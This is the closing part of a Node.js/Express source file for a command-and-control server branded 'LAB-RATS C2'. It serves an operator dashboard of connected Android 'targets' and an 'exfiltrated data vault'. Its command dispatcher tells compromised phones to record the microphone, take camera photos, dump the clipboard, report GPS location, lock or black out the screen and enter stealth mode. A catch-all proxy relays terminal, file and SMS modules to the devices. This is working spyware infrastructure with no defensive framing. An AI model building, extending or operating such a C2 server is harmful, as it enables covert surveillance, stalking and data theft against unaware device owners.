        table { width: 100% !important; border-collapse: separate !important; border-spacing: 0 6px !important; table-layout: auto !important; }
        th { padding: 10px 10px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.78rem !important; letter-spacing: 1px !important; text-transform: uppercase !important; white-space: nowrap !important; vertical-align: middle !important; }
        td { padding: 10px 10px !important; font-size: 0.78rem !important; white-space: nowrap !important; vertical-align: middle !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="text-align:center; padding:5px 0; margin-bottom:5px;">
            <img src="/c2/header_dashboard.png" style="width: 67.5%; max-width: 738px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
        </div>

        <div class="card" style="margin-top: 20px; border-left: 3px solid var(--neon-cyan);">
            <h2 style="text-align: center; color: var(--neon-cyan); margin-bottom: 20px;">CONNECTED_TARGETS</h2>
            <div style="width: 100%;">
                <table>
                    <thead>
                        <tr>
                            <th>DEVICE ID</th>
                            <th>MODEL</th>
                            <th>OS VERSION</th>
                            <th>BATTERY</th>
                            <th>ENDPOINT IP</th>
                            <th>STATUS</th>
                            <th>PROFILE</th>
                            <th>LAST CHECK-IN</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${devicesHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH TARGETS</button>
            </div>
        </div>

        <!-- EXFILTRATED DATA VAULT CARD -->
        <div class="card" style="margin-top: 25px; border-left: 3px solid var(--neon-cyan);">
            <div style="text-align: center; margin-bottom: 20px;">
                <h2 style="margin: 0 auto 5px auto; color: var(--neon-cyan); text-align: center;">EXFILTRATED_DATA_VAULT</h2>
                <span style="font-size: 0.7rem; color: #aaa; display: block; text-align: center;">TOTAL PAYLOADS: <b style="color: var(--neon-green);">${exfiltratedFiles.length}</b></span>
            </div>
            <div style="width: 100%;">
                <table>
                    <thead>
                        <tr>
                            <th>FILE NAME</th>
                            <th>TARGET DEVICE</th>
                            <th>FILE SIZE</th>
                            <th>TIMESTAMP</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${exfilHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH VAULT</button>
            </div>
        </div>

        <!-- FOOTER CARD -->
        <div class="card" style="text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;">
            &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; "The one's who MIND don't matter... The one's who MATTER don't mind..." &nbsp;//&nbsp; Push the Limits
        </div>
    </div>
    <script>
    function renameDevice(deviceId, currentAlias) {
        const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
        if (newName !== null) {
            fetch('/api/rename-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: deviceId, alias: newName.trim() })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showToast("DEVICE_RENAMED");
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showToast('Failed to update name: ' + (data.error || 'Unknown error'), "error");
                }
            })
            .catch(err => showToast('Network error updating device name.', "error"));
        }
    }

    function dispatchQuickCommand(deviceId, action) {
        if (!action) return;

        let path = '/';
        let label = '';

        if (action === 'mic') {
            path = '/audio/mic/start?duration=60';
            label = 'Record Mic (60s)';
        } else if (action === 'flashlight') {
            path = '/device/flashlight';
            label = 'Toggle Flashlight';
        } else if (action === 'blackout') {
            path = '/ghost/interact?action=blackout';
            label = 'Toggle Blackout';
        } else if (action === 'lock') {
            path = '/ghost/lock';
            label = 'Toggle System Lock';
        } else if (action === 'photo') {
            path = '/camera/photo?cam=0';
            label = 'Quick Photo (Rear)';
        } else if (action === 'stealth') {
            path = '/stealth/toggle';
            label = 'Toggle Stealth Mode';
        } else if (action === 'clipboard') {
            path = '/clipboard';
            label = 'Dump Clipboard Buffer';
        } else if (action === 'gps') {
            path = '/gps/locate?json=true';
            label = 'Instant GPS Fix';
        }

        const fullUrl = '/proxy' + path + (path.includes('?') ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
        fetch(fullUrl)
            .then(r => {
                if (r.ok) {
                    showToast('[DISPATCH_SUCCESS] ' + label + ' executed.');
                } else {
                    showToast('Dispatch failed (Status ' + r.status + ')', 'error');
                }
            })
            .catch(err => showToast('Network error dispatching command', 'error'));
    }

    function deleteExfil(id) {
        if (confirm('Permanently delete this exfiltrated payload file from C2 Vault?')) {
            fetch('/api/delete-exfil', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showToast("PAYLOAD_DELETED");
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showToast('Failed to delete file: ' + (data.error || 'Unknown error'), "error");
                }
            })
            .catch(err => showToast('Network error deleting file.', "error"));
        }
    }
    </script>
</body>
</html>`;

    res.send(html);
});

// Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
app.all('*', (req, res) => {
    if (req.path === '/favicon.ico') return res.status(404).end();

    let deviceId = req.query.deviceId || getCookie(req.headers.cookie, 'c2_target_device') || lastActiveDeviceId;

    // Fallback: Pick the most recently active checked-in device
    if (!deviceId && devices.size > 0) {
        let latestDevice = null;
        let latestTime = 0;
        for (const [id, dev] of devices.entries()) {
            const t = new Date(dev.lastSeen || 0).getTime();
            if (t > latestTime) {
                latestTime = t;
                latestDevice = id;
            }
        }
        deviceId = latestDevice || Array.from(devices.keys())[0];
    }

    if (!deviceId) deviceId = 'samsung';

    if (deviceId) {
        lastActiveDeviceId = deviceId;
        res.setHeader('Set-Cookie', `c2_target_device=${encodeURIComponent(deviceId)}; Path=/; SameSite=Lax`);
    }

    if (!devices.has(deviceId)) {
        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
        saveData();
    }

    const requestId = Math.random().toString(36).substring(7);
    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;

    pendingResponses.set(requestId, { res });

    let requestBody = '';
    const contentType = req.headers['content-type'] || '';
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
        if (typeof req.body === 'string') {
            requestBody = req.body;
        } else if (req.body && typeof req.body === 'object') {
            if (contentType.includes('application/json')) {
                requestBody = JSON.stringify(req.body);
            } else {
                requestBody = new URLSearchParams(req.body).toString();
            }
        }
    }

    const cmdObj = {
        type: 'request',
        id: requestId,
        method: req.method,
        path: relayPath,
        cookie: req.headers.cookie || '',
        body: requestBody,
        contentType: contentType || 'application/x-www-form-urlencoded'
    };

    dispatchCommand(deviceId, cmdObj);

    setTimeout(() => {
        if (pendingResponses.has(requestId)) {
            pendingResponses.delete(requestId);
            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
        }
    }, 25000);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
